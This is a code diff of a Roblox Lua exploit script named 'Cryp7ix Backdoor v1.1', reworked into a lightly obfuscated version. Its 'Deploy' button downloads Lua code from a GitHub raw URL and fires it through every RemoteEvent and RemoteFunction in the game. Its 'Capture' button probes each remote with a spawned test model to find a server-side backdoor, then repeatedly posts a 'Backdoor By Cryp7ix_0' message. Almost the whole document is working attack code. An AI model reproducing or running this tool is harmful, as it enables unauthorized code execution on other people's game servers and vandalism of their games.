@@ -1,163 +1,154 @@
--- Cryp7ix Backdoor v1.1
-local HttpService = game:GetService("HttpService")
+-- Cryp7ix Backdoor v1.1 (slightly obfuscated)
+local a,b,c={},nil,false
+local hS=game:GetService("HttpService")
 
--- GUI setup
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "Cryp7ixBackdoor"
-screenGui.Parent = game:GetService("CoreGui")
-screenGui.ResetOnSpawn = false
+-- GUI
+local g=Instance.new("ScreenGui")
+g.Name="Cryp7ixBackdoor"
+g.Parent=game:GetService("CoreGui")
+g.ResetOnSpawn=false
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Parent = screenGui
-mainFrame.Position = UDim2.new(0.5, -180, 0.5, -120)
-mainFrame.Size = UDim2.new(0, 360, 0, 240)
-mainFrame.BackgroundColor3 = Color3.fromRGB(255, 105, 180)
-mainFrame.BorderColor3 = Color3.new(0,0,0)
-mainFrame.Active = true
-mainFrame.Draggable = true
+local f=Instance.new("Frame")
+f.Parent=g
+f.Position=UDim2.new(0.5,-180,0.5,-120)
+f.Size=UDim2.new(0,360,0,240)
+f.BackgroundColor3=Color3.fromRGB(255,105,180)
+f.BorderColor3=Color3.new(0,0,0)
+f.Active=true
+f.Draggable=true
 
-local innerFrame = Instance.new("Frame")
-innerFrame.Parent = mainFrame
-innerFrame.Position = UDim2.new(0, 0, 0, 50)
-innerFrame.Size = UDim2.new(0, 360, 0, 190)
-innerFrame.BackgroundColor3 = Color3.fromRGB(255, 182, 193)
-innerFrame.BorderColor3 = Color3.new(0,0,0)
-innerFrame.Active = true
+local iF=Instance.new("Frame")
+iF.Parent=f
+iF.Position=UDim2.new(0,0,0,50)
+iF.Size=UDim2.new(0,360,0,190)
+iF.BackgroundColor3=Color3.fromRGB(255,182,193)
+iF.BorderColor3=Color3.new(0,0,0)
+iF.Active=true
 
-local codeBox = Instance.new("TextBox")
-codeBox.Parent = innerFrame
-codeBox.Position = UDim2.new(0, 5, 0, 5)
-codeBox.Size = UDim2.new(0, 350, 0, 140)
-codeBox.BackgroundColor3 = Color3.fromRGB(255, 240, 245)
-codeBox.BorderColor3 = Color3.new(0,0,0)
-codeBox.TextColor3 = Color3.new(1,1,1)
-codeBox.MultiLine = true
-codeBox.TextXAlignment = Enum.TextXAlignment.Left
-codeBox.TextYAlignment = Enum.TextYAlignment.Top
-codeBox.Text = game:HttpGet("https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/checkerCode/main.lua")
+local tB=Instance.new("TextBox")
+tB.Parent=iF
+tB.Position=UDim2.new(0,5,0,5)
+tB.Size=UDim2.new(0,350,0,140)
+tB.BackgroundColor3=Color3.fromRGB(255,240,245)
+tB.BorderColor3=Color3.new(0,0,0)
+tB.TextColor3=Color3.new(0,0,0) -- black text
+tB.MultiLine=true
+tB.TextXAlignment=Enum.TextXAlignment.Left
+tB.TextYAlignment=Enum.TextYAlignment.Top
+tB.Text=game:HttpGet("https://raw.githubusercontent.com/harvsxxlll/cryp7ixbackdoor/main/main.lua")
 
-local deployButton = Instance.new("TextButton")
-deployButton.Parent = innerFrame
-deployButton.Position = UDim2.new(0, 5, 0, 150)
-deployButton.Size = UDim2.new(0, 170, 0, 35)
-deployButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147)
-deployButton.BorderColor3 = Color3.new(0,0,0)
-deployButton.TextColor3 = Color3.new(1,1,1)
-deployButton.Font = Enum.Font.Legacy
-deployButton.FontSize = Enum.FontSize.Size14
-deployButton.Text = "Deploy"
+local dB=Instance.new("TextButton")
+dB.Parent=iF
+dB.Position=UDim2.new(0,5,0,150)
+dB.Size=UDim2.new(0,170,0,35)
+dB.BackgroundColor3=Color3.fromRGB(255,20,147)
+dB.BorderColor3=Color3.new(0,0,0)
+dB.TextColor3=Color3.new(1,1,1)
+dB.Font=Enum.Font.Legacy
+dB.FontSize=Enum.FontSize.Size14
+dB.Text="Deploy"
 
-local captureButton = Instance.new("TextButton")
-captureButton.Parent = innerFrame
-captureButton.Position = UDim2.new(0, 185, 0, 150)
-captureButton.Size = UDim2.new(0, 170, 0, 35)
-captureButton.BackgroundColor3 = Color3.fromRGB(255, 20, 147)
-captureButton.BorderColor3 = Color3.new(0,0,0)
-captureButton.TextColor3 = Color3.new(1,1,1)
-captureButton.Font = Enum.Font.Legacy
-captureButton.FontSize = Enum.FontSize.Size14
-captureButton.Text = "Capture"
+local cB=Instance.new("TextButton")
+cB.Parent=iF
+cB.Position=UDim2.new(0,185,0,150)
+cB.Size=UDim2.new(0,170,0,35)
+cB.BackgroundColor3=Color3.fromRGB(255,20,147)
+cB.BorderColor3=Color3.new(0,0,0)
+cB.TextColor3=Color3.new(1,1,1)
+cB.Font=Enum.Font.Legacy
+cB.FontSize=Enum.FontSize.Size14
+cB.Text="Capture"
 
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Parent = mainFrame
-titleLabel.Position = UDim2.new(0, 180, 0, 25)
-titleLabel.Size = UDim2.new(0, 0, 0, 0)
-titleLabel.BackgroundColor3 = Color3.fromRGB(255,192,203)
-titleLabel.BorderColor3 = Color3.new(0,0,0)
-titleLabel.Font = Enum.Font.Legacy
-titleLabel.FontSize = Enum.FontSize.Size14
-titleLabel.TextColor3 = Color3.new(1,1,1)
-titleLabel.Text = "Cryp7ix Backdoor v1.1"
+local lbl=Instance.new("TextLabel")
+lbl.Parent=f
+lbl.Position=UDim2.new(0,180,0,25)
+lbl.Size=UDim2.new(0,0,0,0)
+lbl.BackgroundColor3=Color3.fromRGB(255,192,203)
+lbl.BorderColor3=Color3.new(0,0,0)
+lbl.Font=Enum.Font.Legacy
+lbl.FontSize=Enum.FontSize.Size14
+lbl.TextColor3=Color3.new(1,1,1)
+lbl.Text="Cryp7ix Backdoor v1.1"
 
 -- Remote handling
-local acquiredRemote = nil
-local isScanning = false
+local r=nil
+local aC=false
 
--- Deploy code function
-deployButton.MouseButton1Click:Connect(function()
-	local codeStr = codeBox.Text
-	local invokeEvent = Instance.new("BindableEvent")
-	invokeEvent.Event:Connect(function(remote, str)
-		remote:InvokeServer(str)
+dB.MouseButton1Click:Connect(function()
+	local codeStr=tB.Text
+	local ev=Instance.new("BindableEvent")
+	ev.Event:Connect(function(rm,str)
+		rm:InvokeServer(str)
 	end)
-
-	local function deepFire(instance)
-		if not isScanning then
-			if acquiredRemote == nil then
-				for _, child in pairs(instance:GetChildren()) do
-					if child.Parent ~= game:GetService("RobloxReplicatedStorage") then
-						if child:IsA("RemoteEvent") then
-							child:FireServer(codeStr)
-						elseif child:IsA("RemoteFunction") then
-							invokeEvent:Fire(child, codeStr)
+	local function df(obj)
+		if not aC then
+			if r==nil then
+				for _,v in pairs(obj:GetChildren()) do
+					if v.Parent~=game:GetService("RobloxReplicatedStorage") then
+						if v:IsA("RemoteEvent") then
+							v:FireServer(codeStr)
+						elseif v:IsA("RemoteFunction") then
+							ev:Fire(v,codeStr)
 						end
 					end
-					deepFire(child)
+					df(v)
 				end
 			else
-				if acquiredRemote:IsA("RemoteEvent") then
-					acquiredRemote:FireServer(codeStr)
-				elseif acquiredRemote:IsA("RemoteFunction") then
-					task.spawn(function() acquiredRemote:InvokeServer(codeStr) end)
+				if r:IsA("RemoteEvent") then
+					r:FireServer(codeStr)
+				elseif r:IsA("RemoteFunction") then
+					task.spawn(function() r:InvokeServer(codeStr) end)
 				end
 			end
 		end
 	end
-
-	deepFire(game)
+	df(game)
 end)
 
--- Capture backdoor function
-captureButton.MouseButton1Click:Connect(function()
-	if isScanning then return end
-	isScanning = true
-	codeBox.Text = "-- Scanning for backdoors..."
-	local remoteList = {}
-
-	for _, obj in pairs(game:GetDescendants()) do
-		if obj.Parent ~= game:GetService("RobloxReplicatedStorage") then
+cB.MouseButton1Click:Connect(function()
+	if aC then return end
+	aC=true
+	tB.Text="-- Scanning for backdoors..."
+	local remList={}
+	for _,obj in pairs(game:GetDescendants()) do
+		if obj.Parent~=game:GetService("RobloxReplicatedStorage") then
 			if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-				table.insert(remoteList, obj)
+				table.insert(remList,obj)
 			end
 		end
 	end
-
-	for _, remote in pairs(remoteList) do
-		if acquiredRemote == nil then
-			local randomName = string.char(math.random(0x41,0x5A), math.random(0x41,0x5A), math.random(0x41,0x5A), math.random(0x41,0x5A))
-			local testCode = 'Instance.new("Model",workspace).Name="'..randomName..'"'
-			if remote.Parent ~= game:GetService("RobloxReplicatedStorage") then
-				if remote:IsA("RemoteEvent") then
-					remote:FireServer(testCode)
-				elseif remote:IsA("RemoteFunction") then
-					task.spawn(function() remote:InvokeServer(testCode) end)
+	for _,rm in pairs(remList) do
+		if r==nil then
+			local rndName=string.char(math.random(0x41,0x5A),math.random(0x41,0x5A),math.random(0x41,0x5A),math.random(0x41,0x5A))
+			local testCode='Instance.new("Model",workspace).Name="'..rndName..'"'
+			if rm.Parent~=game:GetService("RobloxReplicatedStorage") then
+				if rm:IsA("RemoteEvent") then
+					rm:FireServer(testCode)
+				elseif rm:IsA("RemoteFunction") then
+					task.spawn(function() rm:InvokeServer(testCode) end)
 				end
 			end
 			wait(2.5)
-			if workspace:FindFirstChild(randomName) and workspace[randomName]:IsA("Model") then
-				acquiredRemote = remote
+			if workspace:FindFirstChild(rndName) and workspace[rndName]:IsA("Model") then
+				r=rm
 			end
 		end
 	end
-
-	if acquiredRemote then
-		codeBox.Text = "-- Backdoor Found"
-
-		-- Permanent hint loop
+	if r then
+		tB.Text="-- Backdoor Found"
 		task.spawn(function()
-			while acquiredRemote do
-				for _, child in pairs(workspace:GetChildren()) do
-					if child:IsA("Hint") then child:Destroy() end
+			while r do
+				for _,ch in pairs(workspace:GetChildren()) do
+					if ch:IsA("Hint") then ch:Destroy() end
 				end
-				local hint = Instance.new("Hint")
-				hint.Text = "Backdoor By Cryp7ix_0"
-				hint.Parent = workspace
+				local h=Instance.new("Hint")
+				h.Text="Backdoor By Cryp7ix_0"
+				h.Parent=workspace
 				wait(9)
 			end
 		end)
 	else
-		codeBox.Text = "-- No Backdoor Detected"
+		tB.Text="-- No Backdoor Detected"
 	end
-
-	isScanning = false
+	aC=false
 end)
